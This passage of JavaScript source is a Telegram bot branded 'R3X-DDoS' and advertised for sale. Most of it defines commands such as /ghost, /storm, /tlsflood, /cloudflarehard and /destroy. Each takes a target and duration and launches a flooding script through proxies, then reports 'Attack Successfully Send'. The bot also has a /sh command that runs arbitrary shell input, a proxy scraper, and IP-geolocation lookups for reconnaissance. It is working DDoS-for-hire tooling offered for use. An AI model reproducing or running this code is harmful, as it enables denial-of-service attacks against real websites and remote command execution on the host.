bot.onText(/^\/ghost(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menjalankan perintah ini.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node ./lib/ASTRAL.js  ${target} ${time} 110 15 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By R3X-DDoS\nTarget: ${target}\nTime: ${time}\nRate: 110\nThread: 15\nDDoS By R3X-DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/chaptca(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menjalankan perintah ini.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node ./lib/CLOUDFLARE.js ${target} ${time} 110 15 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By R3X-DDoS\nTarget: ${target}\nTime: ${time}\nRate: 110\nThread: 15\nDDoS By R3X-DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/thunder(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menjalankan perintah ini.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node ./lib/thunder.js ${target} ${time} 60 15 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By HanzX-DDoS\nTarget: ${target}\nTime: ${time}\nRate: 60\nThread: 15\nDDoS By HanzX-DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/storm(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menjalankan perintah ini.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node ./lib/storm.js ${target} ${time} 110 15 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By R3X-DDoS\nTarget: ${target}\nTime: ${time}\nRate: 110\nThread: 15\nDDoS By R3X-DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/floodvip(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menjalankan perintah ini.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node ./lib/YAT-TLS.js ${target} ${time} 110 15 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By R3X-DDoS\nTarget: ${target}\nTime: ${time}\nRate: 110\nThread: 15\nDDoS By R3X-DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/kill(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menjalankan perintah ini.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node ./lib/LEZKILL.js ${target} ${time} 110 15 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By R3X-DDoS\nTarget: ${target}\nTime: ${time}\nRate: 110\nThread: 15\nDDoS By R3X-DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/strike(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menjalankan perintah ini.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node ./lib/brows.js ${target} ${time} 110 15 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By R3X-DDoS\nTarget: ${target}\nTime: ${time}\nRate: 110\nThread: 15\nDDoS By R3X-DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/cloudflarehard(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menjalankan perintah ini.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node ./lib/CFSTRONG.js ${target} ${time} 15 POST proxy.txt 110`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By R3X-DDoS\nTarget: ${target}\nTime: ${time}\nRate: 110\nThread: 15\nDDoS By R3X-DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/ninja(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menjalankan perintah ini.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node ./lib/Nexus.js POST ${target} proxy.txt ${time} 60 15 `);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By R3X-DDoS\nTarget: ${target}\nTime: ${time}\nRate: 60\nThread: 15\nDDoS By R3X-DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/tlsflood(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menjalankan perintah ini.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node ./lib/Medusa.js ${target} ${time} 110 15 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By R3X-DDoS\nTarget: ${target}\nTime: ${time}\nRate: 110\nThread: 15\nDDoS By R3X-DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/destroy(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menjalankan perintah ini.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node ./lib/destroy.js ${target} ${time} 110 15 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By R3X-DDoS\nTarget: ${target}\nTime: ${time}\nRate: 110\nThread: 15\nDDoS By R3X-DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/destroyV2(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menjalankan perintah ini.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node ./lib/destroys.js ${target} ${time} 110 15 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By R3X-DDoS\nTarget: ${target}\nTime: ${time}\nRate: 110\nThread: 15\nDDoS By R3X-DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.on('callback_query', (callbackQuery) => {
  const message = callbackQuery.message;
  const chatId = message.chat.id;

  if (callbackQuery.data === 'stop') {
    const isAdmin = adminIds.includes(chatId.toString());

    if (!isAdmin) {
      bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menghentikan perintah ini.');
      return;
    }
    stopProcesses(chatId);
  }
});
bot.onText(/^\/upproxy$/, async (msg) => {
  const chatId = msg.chat.id;
  const isAdmin = adminIds.includes(chatId.toString());
  if (!isAdmin) {
    bot.sendMessage(chatId, '*Anda tidak memiliki izin untuk menjalankan perintah ini.*');
    return;
  }
  try {
    if (fs.existsSync('./lib/proxy.txt')) {
      fs.unlinkSync('./lib/proxy.txt');
    }
    await scrapeProxies(chatId);
  } catch (error) {
    bot.sendMessage(chatId, `*Terjadi kesalahan saat memperbarui proxy:* ${error.message}`);
  }
});


bot.onText(/\/sh (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const command = match[1];
  const isAdmin = adminIds.includes(chatId.toString());
  
  if (!isAdmin) {
    bot.sendMessage(chatId, '*❌Anda tidak memiliki izin untuk menjalankan perintah ini.*');
    return;
  }
  
  exec(command, { maxBuffer: parseInt(adminData.limit) * 1024 }, (error, stdout, stderr) => {
    if (error) {
      bot.sendMessage(chatId, `Error: ${error.message}`);
      return;
    }
    if (stderr) {
      bot.sendMessage(chatId, `Stderr: ${stderr}`);
      return;
    }
    bot.sendMessage(chatId, `Output:\n${stdout}`);
  });
});

bot.onText(/^\/info (.+)/, (msg, match) => {
 const chatId = msg.chat.id;
 const web = match[1];
 const data = {
     target: web,
     apikey: 'NOKEY'
 };
 axios.post('https://check-host.cc/rest/V2/info', data, {
    headers: {
      'accept': 'application/json',
      'Content-Type': 'application/json'
   }
 })
 .then(response => {
     const result = response.data;
     if (result.status === 'success') {
         const info = `
          
\`\`\`INFORMASI-WEBSITE
${web}

IP:        ${result.ip}
Hostname:  ${result.hostname}
ISP:       ${result.isp}
ASN:       ${result.asn}
ORG:       ${result.org}
Country:   ${result.country}
Region:    ${result.region}
City:      ${result.city}
Timezone:  ${result.timezone}
Latitude: ${result.latitude}
Longitude: ${result.longitude}
\`\`\`
*About ASN:* \`${result.asnlink}\`
*Website:* \`https://check-host.cc/?m=INFO&target=${web}\`
         `;
         bot.sendMessage(chatId, info, { parse_mode: 'Markdown' });
     } else {
         bot.sendMessage(chatId, 'Failed to get information. Please try again later..');
     }
 })
 .catch(error => {
     console.error(error);
     bot.sendMessage(chatId, 'An error occurred while contacting the API.');
 });
});
bot.onText(/\/script/, (msg) => {
  const chatId = msg.chat.id;

  bot.sendMessage(chatId, "want to buy this Script?\nClick Button Bellow To Contact Developer\n\nNote : Dont Spamm!!",
    {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'Buy Script', url: `https://t.me/R3X_Jatim` }
          ]
        ]
      },
      parse_mode: "Markdown"
    }
  );
});

bot.onText(/\/cekbot/, (msg) => {
  const chatId = msg.chat.id;

  bot.sendMessage(chatId, "Bot Is online!! found an error'? contact the Developer of this bot below😁⬇️",
    {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'Nagato', url: `https://t.me/R3X_Jatim` }
          ]
        ]
      },
      parse_mode: "Markdown"
    }
  );
});

bot.onText(/^(\.|\#|\/)cekip(?: (.+))?$/, async (msg, match) => {
        const chatId = msg.chat.id;
        const ip = match[2];
        if (!ip) {
            bot.sendMessage(chatId, 'Input Link! Example /cekip <ip> ', { reply_to_message_id: msg.message_id });
            return;
        }

        try {
            const response = await axios.get(`https://apikey-premium.000webhostapp.com/loc/?IP=${ip}`);
            
            const data = response.data;
            bot.sendChatAction(chatId, 'typing');
            
            // Kirim informasi ke pengguna
            const message = `
🌐 Creator : R3X-DDoS 🔥
🔍 IP : ${data.query}
📊 Status : ${data.status}
🌍 Country : ${data.country}
🗺️ Country Code : ${data.countryCode}
🏞️ Region : ${data.region}
🏡 Region Name : ${data.regionName}
🏙️ City : ${data.city}
🏘️ District : ${data.district}
🏠 Zip : ${data.zip}
🌍 Latitude : ${data.lat}
🌍 Longitude : ${data.lon}
⏰ Timezone : ${data.timezone}
📶 ISP : ${data.isp}
🏢 Organization : ${data.org}
🌐 AS : ${data.as}
            `;
            
            bot.sendMessage(chatId, message);

            // Kirim lokasi ke pengguna
            bot.sendLocation(chatId, data.lat, data.lon);
        } catch (error) {
            console.error('Error:', error);
            // Kirim pesan error jika terjadi kesalahan
            bot.sendMessage(chatId, 'Terjadi kesalahan dalam memproses permintaan.');
        }
    });
    
bot.onText(/^(\.|\#|\/)tinyurl(?: (.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const url = match[2];
  if (!url) {
      bot.sendMessage(chatId, 'Usage: /tinyulr [web]\nExample: /tinyulr https://web.com', { reply_to_message_id: msg.message_id });
       return;
    }
            
  // Pastikan URL dimulai dengan "http://" atau "https://"
  if (!url.startsWith('http://') && !url.startsWith('https://')) {
    bot.sendMessage(chatId, 'URL must start with "http://" or "https://"');
    return;
  }

  try {
    const response = await axios.get(`https://tinyurl.com/api-create.php?url=${url}`);
    const shortenedUrl = response.data;
    bot.sendChatAction(chatId, 'typing');
    bot.sendMessage(chatId, shortenedUrl);
  } catch (error) {
    console.error('Error:', error);
    bot.sendMessage(chatId, 'Sorry, An error occurred while shortening the url.');
  }
});

bot.onText(/\/owner/, (msg) => {
      const chatId = msg.chat.id;
      const name = msg.from.first_name;
      const buttons = [
        {
          text: 'WhatsApp',
          url: 'https://wa.me/6287823075325'
        },
        {
          text: 'Telegram',
          url: 'https://t.me/R3X_Jatim'
        },
        {
          text: 'YouTube',
          url: '.'
        }
      ];
      bot.sendMessage(chatId, `Hello guys ${name}, You can contact my owner here`, {
        reply_markup: {
          inline_keyboard: [buttons]
        }
      });
    });
bot.on('polling_error', (error) => console.log(error));


